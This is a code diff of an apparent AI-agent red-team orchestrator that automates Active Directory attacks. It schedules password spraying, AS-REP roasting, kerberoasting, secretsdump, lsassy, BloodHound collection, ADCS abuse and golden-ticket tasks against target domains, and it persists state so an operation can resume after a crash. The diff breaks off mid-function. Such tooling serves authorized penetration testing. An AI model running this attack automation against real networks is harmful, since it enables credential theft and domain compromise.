@@ -19,7 +19,13 @@ from dreadnode.agent import Agent, Thread
 from dreadnode.agent.stop import tool_use
 from loguru import logger
 
-from ares.core.config import get_agent_config, get_namespace, get_redis_url
+from ares.core.config import (
+    get_agent_config,
+    get_crack_task_grace_period,
+    get_max_runtime,
+    get_namespace,
+    get_redis_url,
+)
 from ares.core.dispatcher import RedTeamDispatcher
 from ares.core.factories.red_agents import (
     create_role_hooks,
@@ -36,18 +42,11 @@ from ares.core.models import (
     Target,
     TaskStatus,
 )
-from ares.core.recovery import OperationRecoveryManager
+from ares.core.recovery import OperationRecoveryManager, RecoveryError
 from ares.core.task_queue import RedisTaskQueue
 from ares.core.workflows import exploitation_workflow
 from ares.reports.redteam import RedTeamReportGenerator
-from ares.tools.red import RedTeamReportingTools
 from ares.tools.red.orchestrator import OrchestratorTools
-
-# Default max runtime in seconds (60 minutes), configurable via ARES_MAX_RUNTIME env var
-DEFAULT_MAX_RUNTIME = float(os.environ.get("ARES_MAX_RUNTIME", "3600"))
-
-# Grace period for running crack tasks when operation is completing (5 minutes)
-CRACK_TASK_GRACE_PERIOD = float(os.environ.get("ARES_CRACK_GRACE_PERIOD", "300"))
 
 
 def _resolve_model_generator(model: str, openai_api_key: str | None) -> str | rg.Generator:
@@ -148,14 +147,22 @@ async def _load_or_initialize_state(
     initial_credential: Credential | None,
 ) -> None:
     if resume_from_checkpoint:
-        state = await recovery.recover_operation(operation_id)
-        if state:
+        try:
+            state, requeued_task_ids = await recovery.recover_operation(operation_id)
             dispatcher._shared_state = state
+            # Add requeued task IDs to dispatcher so result consumer can track them
+            for task_id in requeued_task_ids:
+                dispatcher._redis_task_ids.add(task_id)
+            if requeued_task_ids:
+                logger.info(
+                    f"Added {len(requeued_task_ids)} requeued task IDs to result consumer tracking"
+                )
             if state.all_credentials or state.all_hashes:
                 dispatcher.signal_credential_access()
             logger.info(f"Resumed operation {operation_id} from checkpoint")
             return
-        logger.warning(f"No checkpoint found for {operation_id}, starting fresh")
+        except RecoveryError:
+            logger.warning(f"No checkpoint found for {operation_id}, starting fresh")
 
     state = dispatcher.shared_state
     # Enable real-time publishing of discoveries to Redis
@@ -296,7 +303,7 @@ def _create_completion_tools(
 
         Example:
             >>> await announce_domain_admin(
-            ...     domain="example.local",
+            ...     domain="contoso.local",
             ...     username="Administrator",
             ...     credential_type="password",
             ...     attack_path="ADCS ESC1 exploit -> cert auth"
@@ -341,7 +348,7 @@ async def run_multi_agent_operation(  # noqa: PLR0912
 
     Args:
         operation_id: Unique identifier for this operation
-        target_domain: Target domain (e.g., "example.local")
+        target_domain: Target domain (e.g., "contoso.local")
         target_ips: List of target IPs to scan
         initial_credential: Optional initial credential
         resume_from_checkpoint: Resume from previous checkpoint
@@ -357,8 +364,13 @@ async def run_multi_agent_operation(  # noqa: PLR0912
     Returns:
         Operation results summary
     """
+    # Apply rigging patches for case-insensitive tool parameters
+    from ares.core.rigging_patches import apply as apply_rigging_patches
+
+    apply_rigging_patches()
+
     # Resolve max runtime from parameter, env, or default
-    resolved_max_runtime = max_runtime if max_runtime is not None else DEFAULT_MAX_RUNTIME
+    resolved_max_runtime = max_runtime if max_runtime is not None else get_max_runtime()
     # Resolve config defaults
     redis_url = redis_url or get_redis_url()
     namespace = namespace or get_namespace()
@@ -371,10 +383,11 @@ async def run_multi_agent_operation(  # noqa: PLR0912
     await dispatcher.start(operation_id)
 
     # Acquire exclusive operation lock
+    # Force acquire when resuming from checkpoint (stale lock from crashed orchestrator)
     task_queue = RedisTaskQueue(redis_url)
     await task_queue.connect()
 
-    if not await task_queue.acquire_operation_lock(operation_id):
+    if not await task_queue.acquire_operation_lock(operation_id, force=resume_from_checkpoint):
         await task_queue.disconnect()
         raise RuntimeError(
             f"Operation {operation_id} is already running by another orchestrator. "
@@ -422,6 +435,7 @@ async def run_multi_agent_operation(  # noqa: PLR0912
             _auto_credential_expansion(dispatcher), name="auto_credential_expansion"
         ),
         asyncio.create_task(_auto_credential_access(dispatcher), name="auto_credential_access"),
+        asyncio.create_task(_auto_crack_dispatch(dispatcher), name="auto_crack_dispatch"),
         asyncio.create_task(_auto_mssql_detection(dispatcher), name="auto_mssql_detection"),
         asyncio.create_task(_auto_adcs_enumeration(dispatcher), name="auto_adcs_enumeration"),
         asyncio.create_task(_auto_share_spider(dispatcher), name="auto_share_spider"),
@@ -433,6 +447,7 @@ async def run_multi_agent_operation(  # noqa: PLR0912
         asyncio.create_task(
             _auto_local_admin_secretsdump(dispatcher), name="auto_local_admin_secretsdump"
         ),
+        asyncio.create_task(_auto_golden_ticket(dispatcher), name="auto_golden_ticket"),
     ]
 
     # Build initial prompt for orchestrator
@@ -482,8 +497,28 @@ async def run_multi_agent_operation(  # noqa: PLR0912
                     logger.info(f"🤖 Connecting to {model}...")
                     result = await orchestrator_agent.run(initial_prompt)
                     _log_orchestrator_result(result, model)
+
+                    # Check if result indicates a fatal error (e.g., auth failure)
+                    if result.stop_reason == "error":
+                        error_msg = str(result.error) if result.error else "Unknown error"
+                        # Auth errors are fatal - no point retrying with bad credentials
+                        if "AuthenticationError" in error_msg or "invalid" in error_msg.lower():
+                            raise RuntimeError(f"Fatal authentication error: {error_msg}")
+                        # Other errors - treat as crash and let retry logic handle
+                        raise RuntimeError(f"Orchestrator returned error: {error_msg}")
+
                     break  # Success - exit the retry loop
                 except Exception as e:
+                    error_str = str(e)
+
+                    # Auth errors are fatal - never retry with bad credentials
+                    if (
+                        "Fatal authentication error" in error_str
+                        or "AuthenticationError" in error_str
+                    ):
+                        logger.error(f"Authentication failed - cannot continue: {e}")
+                        raise
+
                     orchestrator_crash_count += 1
                     state = dispatcher.shared_state
                     has_progress = len(state.all_credentials) > 0 or len(state.all_hashes) > 0
@@ -532,15 +567,13 @@ async def run_multi_agent_operation(  # noqa: PLR0912
             )
             if pending_plaintext:
                 logger.warning(
-                    "Orchestrator stopped ({}) but pending plaintext credentials exist; "
-                    "keeping operation open",
-                    stop_reason,
+                    f"Orchestrator stopped ({stop_reason}) but pending plaintext credentials exist; "
+                    "keeping operation open"
                 )
             else:
                 dispatcher.shared_state.completed = True
                 logger.warning(
-                    "Orchestrator stopped ({}) with no pending tasks; marking operation complete",
-                    stop_reason,
+                    f"Orchestrator stopped ({stop_reason}) with no pending tasks; marking operation complete"
                 )
 
         exploitation_status = await dispatcher.get_exploitation_status()
@@ -664,24 +697,16 @@ async def _create_orchestrator_agent(
     if not shared_state._dispatcher:
         shared_state.set_dispatcher(dispatcher)
 
-    # Create completion tools that can modify shared state (for stop conditions)
-    complete_operation, announce_domain_admin = _create_completion_tools(shared_state, dispatcher)
-
     # Create orchestrator tools with dispatcher wired in
+    # OrchestratorTools includes all orchestrator functionality:
+    # - Stop conditions: complete_operation, announce_domain_admin
+    # - Status: get_operation_summary, get_all_credentials, get_all_hashes, etc.
+    # - Dispatch: dispatch_recon, dispatch_credential_access, etc.
     orchestrator_tools = OrchestratorTools()
     orchestrator_tools.set_dispatcher(dispatcher)
     orchestrator_tools.set_shared_state(shared_state)
 
-    # Reporting tools for status tracking
-    reporting_tools = RedTeamReportingTools()
-    reporting_tools.set_state(shared_state)
-
-    tools = [
-        complete_operation,  # Stop condition tool for marking operation complete
-        announce_domain_admin,  # Stop condition tool for announcing DA achievement
-        orchestrator_tools,  # Coordination tools (dispatch_*, get_*, broadcast_*)
-        reporting_tools,  # record_finding, generate_report
-    ]
+    tools = [orchestrator_tools]
 
     # Load orchestrator-specific instructions
     instructions = load_agent_instructions(AgentRole.ORCHESTRATOR)
@@ -917,8 +942,11 @@ async def _auto_credential_expansion(
     """
     from ares.core.workflows import credential_expansion_loop
 
-    processed_creds: set[tuple[str, str, int]] = set()  # (username, domain, password_hash)
+    # NOTE: processed credentials persisted in state.processed_expansion_creds for restart recovery
     expansion_running = False
+
+    def _make_expansion_key(username: str, domain: str, password: str) -> str:
+        return f"{domain.lower()}:{username.lower()}:{hash(password or '')}"
 
     while True:
         try:
@@ -934,21 +962,21 @@ async def _auto_credential_expansion(
             # Skip if not enough hosts discovered yet
             if len(state.all_hosts) < min_hosts:
                 logger.debug(
-                    f"Waiting for hosts ({len(state.all_hosts)}/{min_hosts}) "
-                    "before credential expansion"
+                    f"Waiting for hosts ({len(state.all_hosts)}/{min_hosts}) before credential expansion"
                 )
                 continue
 
-            # Check for new credentials
-            current_creds = {
-                (c.username, c.domain or "", hash(c.password or "")) for c in state.all_credentials
-            }
-            new_creds = current_creds - processed_creds
+            # Check for new credentials (not yet in persisted state)
+            new_creds = [
+                c
+                for c in state.all_credentials
+                if _make_expansion_key(c.username, c.domain or "", c.password or "")
+                not in state.processed_expansion_creds
+            ]
 
             if new_creds and not expansion_running:
-                new_count = len(new_creds)
                 logger.info(
-                    f"🔑 Auto-expansion: {new_count} new credential(s) detected, "
+                    f"Auto-expansion: {len(new_creds)} new credential(s) detected, "
                     f"triggering lateral movement tests against {len(state.all_hosts)} hosts"
                 )
 
@@ -959,8 +987,10 @@ async def _auto_credential_expansion(
                     logger.warning(f"Credential expansion failed: {e}")
                 finally:
                     expansion_running = False
-                    # Mark all current creds as processed
-                    processed_creds.update(current_creds)
+                    # Mark all current creds as processed (persist to state)
+                    for c in state.all_credentials:
+                        key = _make_expansion_key(c.username, c.domain or "", c.password or "")
+                        state.processed_expansion_creds.add(key)
 
         except asyncio.CancelledError:
             break
@@ -1004,7 +1034,7 @@ async def _auto_mssql_detection(
             queued = await dispatcher.scan_hosts_for_mssql()
 
             if queued > 0:
-                logger.warning(
+                logger.info(
                     f"🗄️ Auto-detected MSSQL: queued {queued} vulnerability(ies) for exploitation"
                 )
 
@@ -1035,8 +1065,8 @@ async def _auto_adcs_enumeration(  # noqa: PLR0912
     """
     # Track (server, user, domain) -> (task_id, attempt_count, last_attempt_time)
     adcs_attempts: dict[tuple[str, str, str], tuple[str, int, float]] = {}
-    successful_servers: set[str] = set()  # Servers with successful enumeration
-    failed_servers: set[str] = set()  # Servers that consistently fail - stop retrying
+    # NOTE: successful_servers persisted in state.processed_adcs_servers for restart recovery
+    failed_servers: set[str] = set()  # Servers that consistently fail - transient
     retry_cooldown = 60.0  # Wait 1 minute before retrying failed tasks
     stuck_task_timeout = 480.0  # Consider tasks stuck after 8 minutes
 
@@ -1063,20 +1093,20 @@ async def _auto_adcs_enumeration(  # noqa: PLR0912
                 logger.debug("ADCS scanner: no ADCS servers detected yet")
                 continue
 
-            # Get domains we know about
-            domains: set[str] = set()
+            # Build current domain set (computed from state each iteration)
+            _iter_domains: set[str] = set()
             if state.target and state.target.domain:
-                domains.add(state.target.domain)
+                _iter_domains.add(state.target.domain)
             for cred in state.all_credentials:
                 if cred.domain:
-                    domains.add(cred.domain)
+                    _iter_domains.add(cred.domain)
 
             current_time = asyncio.get_event_loop().time()
 
             # Try to enumerate each ADCS server with available credentials
             for server_ip, server_hostname in adcs_servers:
-                # Skip servers we've already successfully enumerated
-                if server_ip in successful_servers:
+                # Skip servers we've already successfully enumerated (persisted in state)
+                if server_ip in state.processed_adcs_servers:
                     continue
 
                 # Skip servers that have consistently failed (stop wasting privesc queue time)
@@ -1107,7 +1137,7 @@ async def _auto_adcs_enumeration(  # noqa: PLR0912
                         # Check if the task completed successfully
                         task_info = state.pending_tasks.get(task_id)
                         if task_info and task_info.status == TaskStatus.COMPLETED:
-                            successful_servers.add(server_ip)
+                            state.processed_adcs_servers.add(server_ip)
                             logger.info(f"ADCS enumeration succeeded for {server_ip}")
                             break
 
@@ -1145,13 +1175,13 @@ async def _auto_adcs_enumeration(  # noqa: PLR0912
                     target_domain = cred.domain
                     if not target_domain:
                         target_domain = state.target.domain if state.target else ""
-                    if not target_domain and domains:
-                        target_domain = next(iter(domains))
+                    if not target_domain and _iter_domains:
+                        target_domain = next(iter(_iter_domains))
 
                     if not target_domain:
                         continue
 
-                    logger.warning(
+                    logger.info(
                         f"🔐 Auto-ADCS: Found ADCS server {server_ip} ({server_hostname}), "
                         f"dispatching certipy_find with {cred.domain}\\{cred.username}"
                     )
@@ -1164,11 +1194,13 @@ async def _auto_adcs_enumeration(  # noqa: PLR0912
                         password=cred.password,
                     )
 
+                    # Always record attempt to prevent retry storm when throttled
+                    # The deferred queue handles actual retries for deferred tasks
+                    adcs_attempts[cred_key] = (task_id or "", attempt_count + 1, current_time)
                     if task_id:
-                        adcs_attempts[cred_key] = (task_id, attempt_count + 1, current_time)
                         logger.info(f"ADCS enumeration task {task_id} dispatched for {server_ip}")
-                        # Only dispatch one task per server per cycle
-                        break
+                    # Only dispatch one task per server per cycle
+                    break
 
         except asyncio.CancelledError:
             break
@@ -1192,8 +1224,7 @@ async def _auto_share_spider(
 
     This catches common scenarios like credentials stored in share files.
     """
-    # Track which (host, share, cred) combos we've already spidered
-    spidered_shares: set[tuple[str, str, str, str]] = set()
+    # NOTE: spidered shares persisted in state.processed_spidered_shares ("host:share:user:domain")
 
     while True:
         try:
@@ -1229,15 +1260,13 @@ async def _auto_share_spider(
                     if not cred.password:
                         continue  # Need password for SMB auth
 
-                    # Create unique key for this spider attempt
+                    # Create unique key for this spider attempt (persisted in state)
                     spider_key = (
-                        share.host.lower(),
-                        share.name.lower(),
-                        cred.username.lower(),
-                        (cred.domain or "").lower(),
+                        f"{share.host.lower()}:{share.name.lower()}:"
+                        f"{cred.username.lower()}:{(cred.domain or '').lower()}"
                     )
 
-                    if spider_key in spidered_shares:
+                    if spider_key in state.processed_spidered_shares:
                         continue
 
                     # Dispatch share spider task
@@ -1252,18 +1281,14 @@ async def _auto_share_spider(
                         techniques=["share_spider"],
                     )
 
+                    # Always mark as processed to prevent retry storm when throttled
+                    state.processed_spidered_shares.add(spider_key)
                     if task_id:
-                        spidered_shares.add(spider_key)
                         logger.info(
-                            "🕷️ Auto share spider dispatched: {}\\{} -> {}/{} (task {})",
-                            cred.domain or "(local)",
-                            cred.username,
-                            share.host,
-                            share.name,
-                            task_id,
+                            f"🕷️ Auto share spider dispatched: {cred.domain or '(local)'}\\{cred.username} -> {share.host}/{share.name} (task {task_id})"
                         )
-                        # Only spider each share once per credential - don't flood
-                        break
+                    # Only spider each share once per credential - don't flood
+                    break
 
             await asyncio.sleep(check_interval)
 
@@ -1292,8 +1317,8 @@ async def _auto_bloodhound(  # noqa: PLR0912
         max_retries: Maximum retry attempts per domain
     """
     # Track (domain, username) -> (task_id, attempt_count, last_attempt_time)
-    bloodhound_attempts: dict[tuple[str, str], tuple[str, int, float]] = {}
-    successful_domains: set[str] = set()  # Domains with successful BloodHound
+    bloodhound_attempts: dict[tuple[str, str, str], tuple[str, int, float]] = {}
+    # NOTE: successful domains persisted in state.processed_bloodhound_domains for restart recovery
     retry_cooldown = 120.0  # Wait 2 minutes before retrying failed tasks
 
     while True:
@@ -1312,36 +1337,53 @@ async def _auto_bloodhound(  # noqa: PLR0912
                 logger.debug("BloodHound scanner: waiting for credentials")
                 continue
 
-            # Get all known domains
-            domains: set[str] = set()
+            # Build current domain set (computed from state each iteration)
+            _iter_domains: set[str] = set()
             if state.target and state.target.domain:
-                domains.add(state.target.domain.lower())
+                _iter_domains.add(state.target.domain.lower())
             for cred in state.all_credentials:
                 if cred.domain:
-                    domains.add(cred.domain.lower())
+                    _iter_domains.add(cred.domain.lower())
+            # Include trusted domains discovered via BloodHound/nltest
+            for trusted in state.trusted_domains:
+                if trusted:
+                    _iter_domains.add(trusted.lower())
+            # Also include domains from discovered hosts (parent/sibling domains)
+            for host in state.all_hosts:
+                if host.hostname and "." in host.hostname:
+                    # Extract domain from FQDN (e.g., dc.parent.local -> parent.local)
+                    parts = host.hostname.lower().split(".", 1)
+                    if len(parts) > 1:
+                        host_domain = parts[1]
+                        if host_domain and not host_domain.endswith(".internal"):
+                            _iter_domains.add(host_domain)
 
-            if not domains:
+            if not _iter_domains:
                 continue
 
             current_time = asyncio.get_event_loop().time()
 
             # Try to run BloodHound for each domain
-            for domain in domains:
-                # Skip domains we've already successfully enumerated
-                if domain.lower() in successful_domains:
+            for domain in _iter_domains:
+                # Skip domains we've already successfully enumerated (persisted in state)
+                if domain.lower() in state.processed_bloodhound_domains:
                     continue
 
                 # Find a credential for this domain
-                for cred in state.all_credentials:
-                    if not cred.password:
-                        continue
-
+                # First try same-domain creds, then cross-domain creds (trusts allow this)
+                sorted_creds = sorted(
+                    [c for c in state.all_credentials if c.password],
+                    key=lambda c: (
+                        0 if (c.domain or "").lower() == domain.lower() else 1,
+                        0 if c.is_admin else 1,
+                    ),
+                )
+                for cred in sorted_creds:
                     cred_domain = (cred.domain or "").lower()
-                    # Use credentials from same domain, or if no domain try anyway
-                    if cred_domain and cred_domain != domain.lower():
-                        continue
+                    # Allow cross-domain enumeration via trusts
+                    # (same-domain creds are sorted first above)
 
-                    cred_key = (domain.lower(), cred.username.lower())
+                    cred_key = (domain.lower(), cred.username.lower(), cred_domain)
 
                     # Check if we've already attempted with this credential
                     if cred_key in bloodhound_attempts:
@@ -1350,7 +1392,7 @@ async def _auto_bloodhound(  # noqa: PLR0912
                         # Check if the task completed successfully
                         task_info = state.pending_tasks.get(task_id)
                         if task_info and task_info.status == TaskStatus.COMPLETED:
-                            successful_domains.add(domain.lower())
+                            state.processed_bloodhound_domains.add(domain.lower())
                             logger.info(f"BloodHound collection succeeded for {domain}")
                             break
 
@@ -1374,9 +1416,8 @@ async def _auto_bloodhound(  # noqa: PLR0912
                     else:
                         attempt_count = 0
 
-                    logger.warning(
-                        f"🩸 Auto-BloodHound: Dispatching collection for {domain} "
-                        f"with {cred.domain}\\{cred.username}"
+                    logger.info(
+                        f"🩸 Auto-BloodHound: Dispatching collection for {domain} with {cred.domain}\\{cred.username}"
                     )
 
                     task_id = await dispatcher.request_recon(
@@ -1388,17 +1429,90 @@ async def _auto_bloodhound(  # noqa: PLR0912
                         techniques=["bloodhound"],
                     )
 
+                    # Always record attempt to prevent retry storm when throttled
+                    # The deferred queue handles actual retries for deferred tasks
+                    bloodhound_attempts[cred_key] = (task_id or "", attempt_count + 1, current_time)
                     if task_id:
-                        bloodhound_attempts[cred_key] = (task_id, attempt_count + 1, current_time)
                         logger.info(f"BloodHound task {task_id} dispatched for {domain}")
-                        # Only dispatch one task per domain per cycle
-                        break
+                    # Only dispatch one task per domain per cycle
+                    break
 
         except asyncio.CancelledError:
             break
         except Exception as e:
             logger.error(f"BloodHound automation error: {e}", exc_info=True)
             await asyncio.sleep(check_interval)
+
+
+def _make_cred_key(username: str, domain: str, password: str) -> str:
+    """Generate consistent key for credential expansion tracking."""
+    return f"{domain.lower()}:{username.lower()}:{hash(password)}"
+
+
+def _make_hash_key(username: str, domain: str, hash_value: str) -> str:
+    """Generate consistent key for hash lateral movement tracking."""
+    return f"{domain.lower()}:{username.lower()}:{hash_value[:32]}"
+
+
+def _make_crack_key(username: str, domain: str, hash_value: str, hash_type: str) -> str:
+    """Generate consistent key for crack request tracking."""
+    return f"{domain.lower()}:{username.lower()}:{hash_value[:32]}:{hash_type.upper()}"
+
+
+def _get_dc_ips(state: SharedRedTeamState) -> set[str]:
+    """Get set of IPs that are known Domain Controllers."""
+    dc_ips: set[str] = set()
+    for host in state.all_hosts:
+        if not host.ip:
+            continue
+        roles_str = str(host.roles).lower()
+        if any(marker in roles_str for marker in ("dc", "domain controller", "ad dc")):
+            dc_ips.add(host.ip)
+    return dc_ips
+
+
+def _has_constrained_delegation_for_target(state: SharedRedTeamState, target_ip: str) -> bool:
+    """Check if there's a constrained delegation vulnerability targeting this host.
+
+    If true, we should use the S4U attack path instead of direct secretsdump.
+    """
+    for vuln in state.discovered_vulnerabilities.values():
+        if vuln.vuln_type != "constrained_delegation":
+            continue
+        # Check if target matches the vulnerability's target
+        vuln_target_ip = vuln.details.get("target_ip", "")
+        if vuln_target_ip == target_ip:
+            return True
+        # Also check hostname in target_spn
+        target_spn = vuln.details.get("target_spn", "")
+        if target_spn:
+            # Extract hostname from SPN (e.g., cifs/dc01.contoso.local -> dc01.contoso.local)
+            spn_host = target_spn.split("/", 1)[1] if "/" in target_spn else ""
+            for host in state.all_hosts:
+                if (
+                    host.ip == target_ip
+                    and host.hostname
+                    and spn_host.lower() in host.hostname.lower()
+                ):
+                    return True
+    return False
+
+
+def _is_likely_privileged_credential(username: str, source: str | None) -> bool:
+    """Check if credential is likely to have DA/DCSync rights.
+
+    Returns True for:
+    - Administrator account
+    - Credentials obtained from secretsdump on a DC (likely DA)
+    - Credentials with 'admin' in the name
+    """
+    username_lower = username.lower()
+    if username_lower in ("administrator", "admin", "krbtgt"):
+        return True
+    if "admin" in username_lower:
+        return True
+    # Credentials from secretsdump are likely privileged if they came from a DC
+    return bool(source and "secretsdump" in source.lower())
 
 
 async def _auto_credential_access(  # noqa: PLR0912
@@ -1412,14 +1526,12 @@ async def _auto_credential_access(  # noqa: PLR0912
     1) If no creds/hashes yet, run no-creds AS-REP roast per domain.
     2) For each new credential/hash, run kerberoast + secretsdump attempts.
     3) When new users are discovered without credentials, run username_as_password.
+
+    All tracking is persisted to state for recovery after restart.
     """
-    processed_creds: set[tuple[str, str, str]] = set()
-    processed_hashes: set[tuple[str, str, str]] = set()
-    processed_crack_hashes: set[tuple[str, str, str, str]] = set()
-    processed_no_cred_domains: set[str] = set()
-    processed_username_spray_domains: set[str] = set()  # Domains we've run username_as_password on
-    processed_password_spray_domains: set[str] = set()  # Domains we've run password_spray on
-    last_user_count: dict[str, int] = {}  # Track user counts per domain to detect new users
+    # NOTE: All tracking now uses state fields instead of local variables
+    # This enables recovery after orchestrator restart without duplicate work
+    last_user_count: dict[str, int] = {}  # Only this stays local (non-critical)
 
     while True:
         try:
@@ -1441,62 +1553,65 @@ async def _auto_credential_access(  # noqa: PLR0912
             if not host_ips and state.target and state.target.ip:
                 host_ips = [state.target.ip]
 
-            hosts_by_domain: dict[str, list[str]] = {}
+            _iter_hosts_by_domain: dict[str, list[str]] = {}
             for host in state.all_hosts:
                 if not host.ip:
                     continue
                 hostname = (host.hostname or "").lower()
                 if "." in hostname:
                     host_domain = hostname.split(".", 1)[1]
-                    hosts_by_domain.setdefault(host_domain, []).append(host.ip)
+                    _iter_hosts_by_domain.setdefault(host_domain, []).append(host.ip)
             if state.target and state.target.domain and state.target.ip:
-                hosts_by_domain.setdefault(state.target.domain.lower(), []).append(state.target.ip)
+                _iter_hosts_by_domain.setdefault(state.target.domain.lower(), []).append(
+                    state.target.ip
+                )
 
-            domains: set[str] = set()
+            # Build current domain set (computed from state each iteration)
+            _iter_domains: set[str] = set()
             if state.target and state.target.domain:
-                domains.add(state.target.domain)
+                _iter_domains.add(state.target.domain)
             for cred in state.all_credentials:
                 if cred.domain:
-                    domains.add(cred.domain)
+                    _iter_domains.add(cred.domain)
             for user in state.all_users:
                 if user.domain:
-                    domains.add(user.domain)
+                    _iter_domains.add(user.domain)
 
-            if not domains:
+            if not _iter_domains:
                 await dispatcher.wait_for_credential_access_signal(check_interval)
                 continue
 
             has_new_creds = any(
-                (cred.username, cred.domain or "", cred.password or "") not in processed_creds
+                _make_cred_key(cred.username, cred.domain or "", cred.password or "")
+                not in state.processed_cred_expansion
                 for cred in state.all_credentials
             )
             has_new_hashes = any(
-                (hash_obj.username, hash_obj.domain or "", hash_obj.hash_value)
-                not in processed_hashes
+                _make_hash_key(hash_obj.username, hash_obj.domain or "", hash_obj.hash_value)
+                not in state.processed_hash_lateral
                 for hash_obj in state.all_hashes
             )
             has_new_cracks = any(
-                (
+                _make_crack_key(
                     hash_obj.username,
                     hash_obj.domain or "",
                     hash_obj.hash_value,
-                    (hash_obj.hash_type or "").upper(),
+                    hash_obj.hash_type or "",
                 )
-                not in processed_crack_hashes
+                not in state.processed_crack_requests
                 and not hash_obj.cracked_password
                 for hash_obj in state.all_hashes
             )
             has_new_domains = (
                 not state.all_credentials
                 and not state.all_hashes
-                and any(domain not in processed_no_cred_domains for domain in domains)
+                and any(d.lower() not in state.processed_asrep_domains for d in _iter_domains)
             )
             # Check if any domain has users but hasn't had password spray run yet
             has_unsprayed_users = any(
-                domain not in processed_password_spray_domains
-                and sum(1 for u in state.all_users if (u.domain or "").lower() == domain.lower())
-                >= 3
-                for domain in domains
+                d.lower() not in state.processed_password_spray
+                and sum(1 for u in state.all_users if (u.domain or "").lower() == d.lower()) >= 3
+                for d in _iter_domains
             )
 
             if not (
@@ -1510,32 +1625,36 @@ async def _auto_credential_access(  # noqa: PLR0912
                 continue
 
             if not state.all_credentials and not state.all_hashes:
-                for domain in sorted(domains):
-                    if domain in processed_no_cred_domains:
+                for domain in sorted(_iter_domains):
+                    if domain.lower() in state.processed_asrep_domains:
                         continue
-                    domain_hosts = hosts_by_domain.get(domain.lower(), []) or host_ips
-                    # Include low-hanging fruit techniques that work without credentials
-                    task_id = await dispatcher.request_credential_access(
+                    domain_hosts = _iter_hosts_by_domain.get(domain.lower(), []) or host_ips
+                    # These techniques work without credentials:
+                    # - asrep_roast: queries DC for accounts without pre-auth
+                    # - username_as_password: auto-enumerates users via null session, then tests user=pass
+                    # - password_spray: auto-enumerates users, sprays common passwords
+                    fruit_task_id = await dispatcher.request_credential_access(
                         source_agent="orchestrator",
                         domain=domain,
                         target_ips=domain_hosts,
                         reason="low_hanging_fruit_no_creds",
                         techniques=[
-                            "username_as_password",  # Test user:user combos (e.g., hodor:hodor)
-                            "password_spray",  # Common passwords
+                            "username_as_password",  # Auto-enumerates users, tests user:user
+                            "password_spray",  # Auto-enumerates users, sprays common passwords
                             "asrep_roast",  # Users without pre-auth
                         ],
                     )
-                    if task_id:
-                        processed_no_cred_domains.add(domain)
+                    # Always mark as processed to prevent retry storm when throttled
+                    # The deferred queue handles actual retries for deferred tasks
+                    state.processed_asrep_domains.add(domain.lower())
+                    if fruit_task_id:
                         logger.info(
-                            "Auto credential access (low-hanging fruit, no-creds) dispatched for domain %s",
-                            domain,
+                            f"Auto credential access (low-hanging fruit, no-creds) dispatched for domain {domain}"
                         )
 
             # Check for new users without credentials - run username_as_password on them
-            # This catches cases like hodor:hodor where username equals password
-            for domain in sorted(domains):
+            # This catches cases like testuser:testuser where username equals password
+            for domain in sorted(_iter_domains):
                 # Find users in this domain that don't have credentials
                 domain_users = [
                     u.username
@@ -1556,11 +1675,11 @@ async def _auto_credential_access(  # noqa: PLR0912
                         enum_cred = c
                         break
 
-                domain_hosts = hosts_by_domain.get(domain.lower(), []) or host_ips
+                domain_hosts = _iter_hosts_by_domain.get(domain.lower(), []) or host_ips
 
                 # Run username_as_password if we have enough users and haven't done it yet
-                should_run_username_spray = domain not in processed_username_spray_domains
-                if domain in processed_username_spray_domains:
+                should_run_username_spray = domain.lower() not in state.processed_username_spray
+                if domain.lower() in state.processed_username_spray:
                     # Re-run if we've discovered significantly more users
                     current_count = len(domain_users)
                     prev_count = last_user_count.get(domain.lower(), 0)
@@ -1576,9 +1695,10 @@ async def _auto_credential_access(  # noqa: PLR0912
                         reason="low_hanging_fruit_new_users",
                         techniques=["username_as_password"],
                     )
+                    # Always mark as processed to prevent retry storm when throttled
+                    state.processed_username_spray.add(domain.lower())
+                    last_user_count[domain.lower()] = len(domain_users)
                     if task_id:
-                        processed_username_spray_domains.add(domain)
-                        last_user_count[domain.lower()] = len(domain_users)
                         cred_info = (
                             f"{enum_cred.domain}\\{enum_cred.username}"
                             if enum_cred
@@ -1590,7 +1710,7 @@ async def _auto_credential_access(  # noqa: PLR0912
 
                 # Run password_spray with common passwords if we have users and haven't done it
                 # This is separate from username_as_password - we spray common passwords
-                if domain not in processed_password_spray_domains and len(domain_users) >= 3:
+                if domain.lower() not in state.processed_password_spray and len(domain_users) >= 3:
                     task_id = await dispatcher.request_credential_access(
                         source_agent="orchestrator",
                         domain=domain,
@@ -1600,115 +1720,184 @@ async def _auto_credential_access(  # noqa: PLR0912
                         reason="low_hanging_fruit_password_spray",
                         techniques=["password_spray"],
                     )
+                    # Always mark as processed to prevent retry storm when throttled
+                    state.processed_password_spray.add(domain.lower())
                     if task_id:
-                        processed_password_spray_domains.add(domain)
                         logger.info(
-                            "Auto password_spray dispatched for %d users in %s",
-                            len(domain_users),
-                            domain,
+                            f"Auto password_spray dispatched for {len(domain_users)} users in {domain}"
                         )
 
+            # Get DC IPs for smart targeting
+            dc_ips = _get_dc_ips(state)
+
             for cred in state.all_credentials:
-                key = (cred.username, cred.domain or "", cred.password or "")
-                if key in processed_creds:
+                # Skip credentials without valid username - can't use for authenticated techniques
+                if not cred.username or not cred.username.strip():
+                    continue
+                key = _make_cred_key(cred.username, cred.domain or "", cred.password or "")
+                if key in state.processed_cred_expansion:
                     continue
                 domain_name = cred.domain or (state.target.domain if state.target else "")
-                domain_hosts = hosts_by_domain.get(domain_name.lower(), []) or host_ips
-                task_id = await dispatcher.request_credential_access(
-                    source_agent="orchestrator",
-                    domain=domain_name,
-                    target_ips=domain_hosts,
-                    username=cred.username,
-                    password=cred.password,
-                    credential_source=cred.source,
-                    reason="new_credential",
-                    techniques=["kerberoast", "secretsdump", "lsassy"],
-                )
+                domain_hosts = _iter_hosts_by_domain.get(domain_name.lower(), []) or host_ips
+
+                # Separate DC hosts from non-DC hosts for smart credential usage
+                non_dc_hosts = [h for h in domain_hosts if h not in dc_ips]
+                dc_hosts_in_domain = [h for h in domain_hosts if h in dc_ips]
+
+                # For non-DC hosts: always try secretsdump + lsassy (might have local admin)
+                cred_task_id: str | None = None
+                if non_dc_hosts:
+                    cred_task_id = await dispatcher.request_credential_access(
+                        source_agent="orchestrator",
+                        domain=domain_name,
+                        target_ips=non_dc_hosts,
+                        username=cred.username,
+                        password=cred.password,
+                        credential_source=cred.source,
+                        reason="new_credential_non_dc",
+                        techniques=["kerberoast", "secretsdump", "lsassy"],
+                    )
+
+                # For DC hosts: only try secretsdump if credential is privileged OR
